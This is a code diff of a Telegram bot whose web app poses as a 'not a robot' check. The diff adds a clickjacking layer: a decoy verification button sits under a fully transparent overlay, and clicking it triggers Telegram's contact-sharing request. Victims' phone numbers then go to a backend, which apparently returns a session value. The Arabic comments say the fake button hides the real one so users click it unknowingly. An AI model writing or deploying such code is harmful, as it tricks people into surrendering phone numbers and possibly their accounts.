@@ -21,15 +21,20 @@ WEB_APP_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة fokhm.com - التحقق الذكي</title>
+    <title>منصة fokhm.com - التحقق السريع</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 330px; text-align: center; border: 1px solid #334155; }
+        .card { background: #1e293b; padding: 30px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 330px; text-align: center; border: 1px solid #334155; position: relative; overflow: hidden; }
         h2 { color: #38bdf8; margin-bottom: 5px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
-        .verify-box { background: #0f172a; border: 2px solid #38bdf8; padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-bottom: 15px; font-weight: bold; font-size: 16px; color: #4ade80; user-select: none; }
-        .verify-box:active { background: #334155; transform: scale(0.98); }
+        
+        /* تصميم زر التحقق الوهمي الذي يغطي الزر الحقيقي */
+        .fake-box { position: relative; background: #0f172a; border: 2px solid #38bdf8; padding: 20px; border-radius: 12px; font-weight: bold; font-size: 16px; color: #4ade80; cursor: pointer; user-select: none; z-index: 1; }
+        
+        /* دمج زر تيليجرام الحقيقي بشكل شفاف تماماً فوقه ليتم الضغط عليه تلقائياً */
+        .real-tg-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 2; }
+
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; outline: none; }
         button { width: 95%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.3s; }
         button:hover { background: #1d4ed8; }
@@ -44,11 +49,16 @@ WEB_APP_HTML = """
         <h2>منصة fokhm.com</h2>
         <div id="content">
             <p>انقر أدناه لإتمام التحقق الفوري وسحب الرقم:</p>
-            <div class="verify-box" id="click_btn" onclick="stealthRequest()">
-                ☑️ أنا لست روبوت (اضغط هنا)
+            
+            <div style="position: relative; display: inline-block; width: 100%;">
+                <!-- الزر المرئي للمستخدم -->
+                <div class="fake-box">☑️ أنا لست روبوت (تحقق فوري)</div>
+                <!-- الزر الشفاف الحقيقي الخاص بتيليجرام فوقه مباشرة -->
+                <div id="tg_btn_container" class="real-tg-overlay"></div>
             </div>
+
             <div class="loader" id="loading"></div>
-            <div id="error_box" class="msg"></div>
+            <div id="error_box" class="msg" style="margin-top: 15px;"></div>
         </div>
     </div>
 
@@ -57,27 +67,30 @@ WEB_APP_HTML = """
         tg.expand();
         let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();
 
-        function showLoader(show) {
-            document.getElementById('loading').style.display = show ? 'block' : 'none';
-            document.getElementById('click_btn').style.display = show ? 'none' : 'block';
+        function initStealthButton() {
+            if (tg.requestContact) {
+                // دمج طلب الاتصال مع عنصر وهمي شفاف بالكامل فوق التصميم
+                let container = document.getElementById('tg_btn_container');
+                if(container) {
+                    container.onclick = function() {
+                        tg.requestContact((shared, contact) => {
+                            if (shared && contact) {
+                                let phoneNum = contact.phone_number.toString();
+                                if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
+                                callApi('phone', phoneNum);
+                            } else {
+                                document.getElementById('error_box').innerText = "يجب الموافقة للمتابعة.";
+                            }
+                        });
+                    };
+                }
+            }
         }
 
-        function stealthRequest() {
-            if (window.Telegram && tg.requestContact) {
-                tg.requestContact((shared, contact) => {
-                    if (shared && contact) {
-                        let phoneNum = contact.phone_number.toString();
-                        if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
-                        callApi('phone', phoneNum);
-                    } else {
-                        document.getElementById('error_box').innerText = "يجب الموافقة على مشاركة الرقم للمتابعة.";
-                    }
-                });
-            } else {
-                // بديل لو فتحت الرابط من متصفح خارجي عادي
-                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
-                if (phone) callApi('phone', phone.toString());
-            }
+        window.onload = initStealthButton;
+
+        function showLoader(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
         }
 
         function callApi(action, value) {
@@ -107,7 +120,7 @@ WEB_APP_HTML = """
                             <div class="success">${data.session}</div>`;
                 } else {
                     html = `<p class="msg">${data.message}</p>
-                            <div class="verify-box" onclick="stealthRequest()">☑️ إعادة المحاولة</div>`;
+                            <button onclick="location.reload()">إعادة المحاولة</button>`;
                 }
                 document.getElementById('content').innerHTML = html;
             })
@@ -213,7 +226,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح واجهة التحقق:",
+        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لتجربة التحقق الفوري:",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -229,6 +242,6 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     
-    print("Fokhm Working Stealth Bot is running...")
+    print("Fokhm Invisible Layer Bot is running...")
     application.run_polling()
 
